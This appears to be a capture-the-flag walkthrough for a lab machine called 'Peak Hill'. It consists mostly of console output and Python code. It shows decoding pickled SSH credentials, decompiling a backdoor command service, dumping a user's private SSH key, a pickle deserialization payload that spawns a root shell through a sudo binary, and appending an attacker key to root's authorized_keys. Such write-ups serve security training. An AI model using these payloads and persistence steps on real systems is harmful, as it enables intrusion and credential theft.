https://youtu.be/uS37TujnLRw

# recon
## ports
```
20/tcp closed ftp-data
21/tcp open   ftp
22/tcp open   ssh
```

```py
import pickle
f = open('creds', 'r').read()
creds = pickle.loads(hexstr)
print(creds)
```

```
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```

```py
import pickle
f = open('creds.txt', 'rb').read()
creds = pickle.loads(f)
passlist = []
userlist = []
for i in range(len(creds)):
	pass_or_user = creds[i]
	if 'ssh_user' in pass_or_user[0]:
		userlist.append((int(pass_or_user[0].replace('ssh_user','')),pass_or_user[1]))
	else:
		passlist.append((int(pass_or_user[0].replace('ssh_pass','')),pass_or_user[1]))

# sort
passlist.sort()
userlist.sort()
username = ''
password = ''
for user in userlist:
	username += user[1]
for pwd in passlist:
	password += pwd[1]
print('usr: '+ username)
print('pwd: '+ password)
```

username: gherkin
password: p1ckl3s_@11_@r0und_th3_w0rld
```console
gherkin@ubuntu-xenial:~$ strings cmd_service.pyc 
bytes_to_long
long_to_bytesN)
*illidl
tnfZ
P/93vf\
Servicec
Username: s
Password: TF)
```

```console
kali@kali:~$ scp gherkin@$IP:/home/gherkin/cmd_service.pyc THM/hill/
gherkin@10.10.65.138's password: 
cmd_service.pyc 
```

```console
[10.11.14.220]  kali@kali:~/THM/hill$ uncompyle6 cmd_service.pyc 
# uncompyle6 version 3.7.3
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.3 (default, May 14 2020, 11:03:12) 
# [GCC 9.3.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 13:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
# okay decompiling cmd_service.pyc
```

```console
>>> from Crypto.Util.number import bytes_to_long, long_to_bytes
>>> username = long_to_bytes(1684630636)
>>> password = long_to_bytes(2457564920124666544827225107428488864802762356)
>>> print(username)
b'dill'
>>> print(password)
b'n3v3r_@_d1ll_m0m3nt'
```


```console
Cmd: cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0

Cmd: cat /home/dill/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
/V7pwBay5mHnsAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----
```

```console
kali@kali:~/THM/hill$ chmod 700 id_rsa 
kali@kali:~/THM/hill$ ssh dill@$IP -i id_rsa 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


28 packages can be updated.
19 updates are security updates.


Last login: Wed May 20 21:56:05 2020 from 10.1.122.133
dill@ubuntu-xenial:~$ ls
user.txt
dill@ubuntu-xenial:~$
```
```console
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: potato 
failed to decode base64
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: potato
failed to decode base64
dill@ubuntu-xenial:~$ echo 'potato' | base64
cG90YXRvCg==
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: cG90YXRvCg==
this not grow did not grow on the Peak Hill Farm! :(
dill@ubuntu-xenial:~$ 
```
```py
import pickle, os, base64
class get_payload (object):
	def __reduce__(self):
		return (os.system, ('/bin/bash', ))
shell = base64.b64encode(pickle.dumps(get_payload()))
print(shell)
```


```
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$ cat /opt/peak_hill_farm/peak_hill_farm
cat: /opt/peak_hill_farm/peak_hill_farm: Permission denied
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: potato
failed to decode base64
dill@ubuntu-xenial:~$ 
```

```console
root@ubuntu-xenial:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsrlqENSp1GdI4o924mU3yiaDXr2vK50aAK1oeOmA+sTzA0AX8Lz3BTus2gX7VDNjhj9RA58Q8sPaMuzQJ5qfPTHi1u3WDbeL60EiOdM6DA9En6CiGlh2ixqO7rvtHqxP2q9BJM+/x0g20VA2Tp0/918m2pdFahOsbB1BVUs631VqD/Yt3CLtKFDIPi00I5gnIyCZ+1hxz5WUCO3Gh8zVwfe6/uwqRxFRyWx4hUDIrR7xlEP46M5goBtMXVRVjqLXBjH/iAT5TFdfaVWpM5YaXpAgy2zVpnDIim6Cio5R/v9gXbHFv7+l/+J4WwmSBg1ifPAkysLDeyZnhnB5/J3TMpLjQKW6vcRVe2vTncMGDh1qDCpZusgOBmOpanq+qTbP5izg8gZqp177ixXdaQtJulmRcx6aQbnj8oQUlTnIh7YTCTNGoGL3lQUDVUUrNHbNeUSwdy+whUB8rqW+PJTkOVqR6U7hLithlKZGEqea81FqT+2TBKDKacPqdGd2+jRk= kali@kali' >> .ssh/authorized_keys
```
```console
kali@kali:~/THM/hill$ ssh root@$IP
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


28 packages can be updated.
19 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu-xenial:~# cat *
e88f0a01135c05cf0912cf4bc335ee28
root@ubuntu-xenial:~# ^C
root@ubuntu-xenial:~# 
```